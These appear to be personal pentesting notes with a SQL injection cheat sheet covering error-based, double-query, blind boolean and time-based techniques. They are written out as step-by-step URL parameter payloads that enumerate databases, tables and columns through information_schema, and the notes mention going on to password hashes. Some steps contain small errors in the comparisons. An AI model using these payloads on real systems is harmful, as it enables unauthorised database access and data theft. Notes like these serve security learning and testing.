# Web App Enum

## Subdomain hunting using assetfinder



## SQL injection

### GET ERROR BASED
Used on Urls with GET req, mostly have a parameter that is vulnerable to injection such as ?id= etc,etc,etc<br>
First try on webpage and then try on burpsuite and look at the response recieved<br>
lets take **?id=** as the vuln parameter
1. First make sure the url is connected to database ?id=1 or some sorts
2. try **?id=\\** , \\ is a charecter escape, if it's not filtered it will tell us what the developer has used to encapsulate its params.
3. use ' , " , ") , ') etc to get error that reflects on to the page or in burpsuite response  
4. if the above breaks the query,ie produces error either balance it or comment everything else out, the**latter is preferred** 
5. we can comment using --+, # ,-- , (the comma is intentionally with one space as the space is the delimiter in url)
6. use order by  to determine how many columns are there in the db, for example if the db has 3 columns order by 4 will throw error.
7. use Union All Select to find what all columns are reflected on the page. Example:  Union all select m,y,g. Returns Y and M then it shows that the first and the second columns are being reflected. Also dont forget to change ?id=1 to ?id =999999999  or to any number that is not in db if db only has 5 member ?id=10 will work too
8. Use these columns to enumerate with cmds such as  database(),version(),@@datadir,current_user
9. We stop above if we are bugbounty hunting but if we are in internal pentest and want to get password hashes and more access continue down further
10. we can find which database we are using thanks to database()
11. now let look at query till now 
12. ?id=-1')Union all select 1,database(),3 --+
13. the above gave us **security** as the db name.
14. ?id=-1') Union all select 1, table_name, 3 from information_schema.tables where table_schema="security" limit **1**,1
15. the above query will return us the first table name in the database schema **security** to read other table name  change the value of the highlighted 1.
16. we got email, users, referer, uagents.
17. ?id=-1') Union all select 1,group_concat(column_name),3 from information_schema.columns where table_name="Users" 
18. And so on ....

### GET DOUBLE QUERY ERROR BASED
Almost the same as ERROR BASED, here we need to force the query to return error and give us our answer in midts of this<br>

select count(\*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()\*2))a from information_schema.columns group by a<br>
use the above to process and give error<br>
breaking and making the query is same as the ERROR based.<br>

### GET BLIND BOOLEAN BASED
Break the query in the same way as in Error based<br>
to confirm add AND 1=0 <br>
so <br>
?id=1' AND 1=0 --+ should not return anything<br>
but<br>
?id=1' AND 1=1 --+ should return something<br>
now open ascii chart<br>

use substr() and ascii()<br>
?id=9' AND 1=1 AND  (ascii(substr(database(),1,1) )>0)  --+ if yes then go to 255 <br>
?id=9' AND 1=1 AND  (ascii(substr(database(),1,1) )<0)  --+ if yes then go to (255+1)/2=128<br>
?id=9' AND 1=1 AND  (ascii(substr(database(),1,1) )<0)  --+ so now the charecter lies inbetween 1 and 128 again go to (128+1)/2 and check which range it lies and continue till we get the answer.

### GET BLIND TIME BASED
Here we cannot just break the query.<br>
lets say ?id= is vuln  to -> "<br>
to get a response while breaking it we need <br>
?id=1" AND sleep(10) --+  so if our webpage takes 10 secs to refresh we will say yeah its vuln to "

Now to extract data we do the same as in blind boolean, as in we will use ">" , "<" ,"=" to pinpoint our letters.
?id=1" AND if ((ascii(substr(database(),1,1))= 115),sleep(10),sleep(1)) 
